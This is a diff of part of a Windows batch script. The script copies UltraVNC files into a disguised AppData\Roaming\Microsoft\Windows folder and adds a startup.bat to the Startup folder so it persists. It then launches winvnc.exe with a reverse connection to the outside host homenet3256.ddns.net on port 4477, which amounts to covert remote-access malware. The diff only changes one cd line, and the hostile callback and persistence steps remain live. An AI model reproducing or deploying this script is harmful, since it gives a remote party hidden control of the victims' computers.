@@ -44,7 +44,7 @@ copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\UltraVNC.ini" "C
 copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\winvnc.exe" "C:\users\%username%\AppData\Roaming\Microsoft\Windows"
 copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\startup.bat" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 start /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows" winvnc.exe
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows
 start winvnc.exe -connect homenet3256.ddns.net::4477
 exit /b
 
